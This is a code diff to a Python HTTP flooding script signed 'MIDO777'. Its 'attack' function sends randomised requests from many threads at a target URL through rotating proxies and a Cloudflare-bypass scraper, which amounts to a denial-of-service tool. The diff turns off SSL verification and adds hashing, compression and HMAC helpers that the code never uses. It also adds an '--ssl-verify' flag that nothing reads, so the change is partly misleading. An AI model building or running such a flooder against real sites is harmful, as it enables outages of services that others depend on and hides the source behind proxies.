@@ -1,4 +1,4 @@
-!/usr/bin/env python3
+#!/usr/bin/env python3
 # Coded by MIDO777
 import requests
 import time
@@ -20,6 +20,17 @@ from collections import deque
 from uuid import uuid4
 import signal
 import sys
+import ssl
+import socket
+import urllib3
+from urllib3.exceptions import InsecureRequestWarning
+from http.client import HTTPConnection, HTTPSConnection
+import hashlib  # Added for hashing
+import zlib  # Added for compression
+import hmac  # Added for HMAC
+
+# Disable SSL warnings
+urllib3.disable_warnings(InsecureRequestWarning)
 
 # Initialize colorama
 init(autoreset=True)
@@ -86,7 +97,7 @@ def validate_proxies(proxies):
 
 def check_proxy(proxy: str):
     try:
-        response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
+        response = requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3, verify=False)
         return response.status_code == 200
     except requests.RequestException:
         return False
@@ -120,6 +131,25 @@ def generate_payload(payload_type: str):
     else:
         return None
 
+def generate_hashed_payload(payload: str, hash_type: str = "sha256"):
+    """Generate a hashed version of the payload."""
+    if hash_type == "sha256":
+        return hashlib.sha256(payload.encode()).hexdigest()
+    elif hash_type == "md5":
+        return hashlib.md5(payload.encode()).hexdigest()
+    elif hash_type == "sha1":
+        return hashlib.sha1(payload.encode()).hexdigest()
+    else:
+        return payload
+
+def compress_payload(payload: str):
+    """Compress the payload using zlib."""
+    return zlib.compress(payload.encode())
+
+def generate_hmac_signature(payload: str, key: str):
+    """Generate HMAC signature for the payload."""
+    return hmac.new(key.encode(), payload.encode(), hashlib.sha256).hexdigest()
+
 def attack(target_url: str, stop_event: threading.Event, pause_time: float, proxies=None, headers=None, payload_type="json"):
     global requests_sent, successful_requests, failed_requests, last_time
     scraper = create_scraper()
@@ -131,10 +161,21 @@ def attack(target_url: str, stop_event: threading.Event, pause_time: float, prox
             method = random.choice(HTTP_METHODS)
             payload = generate_payload(payload_type) if method in ["POST", "PUT", "PATCH"] else None
 
+            # Enhance payload with hashing, compression, or HMAC
+            if payload:
+                hashed_payload = generate_hashed_payload(payload)
+                compressed_payload = compress_payload(payload)
+                hmac_signature = generate_hmac_signature(payload, "secret_key")
+
+                # You can choose to send the hashed, compressed, or signed payload
+                # payload = hashed_payload  # Example: Send hashed payload
+                # payload = compressed_payload  # Example: Send compressed payload
+                # headers["X-HMAC-Signature"] = hmac_signature  # Example: Add HMAC signature to headers
+
             proxy = {"http": next(proxy_pool), "https": next(proxy_pool)} if proxy_pool else None
 
             response = scraper.request(
-                method, target_url, headers=headers, proxies=proxy, timeout=5, data=payload
+                method, target_url, headers=headers, proxies=proxy, timeout=5, data=payload, verify=False
             )
 
             with requests_lock:
@@ -192,13 +233,14 @@ def parse_args():
     parser.add_argument("-u", "--url", required=True, help="Target URL")
     parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads")
     parser.add_argument("-p", "--pause", type=float, default=0.1, help="Pause time between requests")
-    parser.add_argument("-d", "--duration", type=int, default=999999999999999999999, help="Test duration (seconds)")
+    parser.add_argument("-d", "--duration", type=int, default=9999, help="Test duration (seconds)")
     parser.add_argument("--proxies", help="File containing proxy list")
     parser.add_argument("--headers", help="Custom headers as JSON string")
     parser.add_argument("--payload", choices=["json", "xml", "form"], default="json", help="Payload type")
     parser.add_argument("--results", help="File to save results (CSV)")
     parser.add_argument("-l", "--logfile", default="test.log", help="Log file")
     parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
+    parser.add_argument("--ssl-verify", action="store_true", help="Enable SSL verification")
     return parser.parse_args()
 
 def setup_logging(logfile: str, verbose: bool):
